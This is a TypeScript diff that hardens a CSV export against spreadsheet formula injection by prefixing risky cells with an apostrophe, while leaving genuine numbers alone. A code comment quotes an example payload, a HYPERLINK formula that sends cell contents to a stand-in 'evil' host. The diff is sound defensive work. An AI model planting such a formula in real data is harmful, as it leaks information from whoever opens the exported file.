@@ -1,7 +1,20 @@
 /** Same hand-rolled CSV shape as ManifestService.renderCsv — no external
  * CSV library dependency for a format this simple. */
-function escapeCsvField(value: string): string {
-  return /[",\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
+/**
+ * A spreadsheet treats a cell that starts with = + - @ (or a tab/CR) as a FORMULA, so a customer whose
+ * name is `=HYPERLINK("http://evil/?"&A1,"x")` turns an export into an attack on whoever opens it
+ * (Phase 22 S-32). Such text is prefixed with an apostrophe, which spreadsheets show as plain text.
+ * Genuine numbers (a refund of -500) are left alone.
+ */
+export function neutraliseFormula(value: string): string {
+  if (!/^[=+\-@\t\r]/.test(value)) return value;
+  if (/^[+-]?\d+(\.?\d+)?$/.test(value)) return value;
+  return `'${value}`;
+}
+
+export function escapeCsvField(value: string): string {
+  const safe = neutraliseFormula(value);
+  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
 
 export function toCsv(headers: string[], rows: string[][]): string {
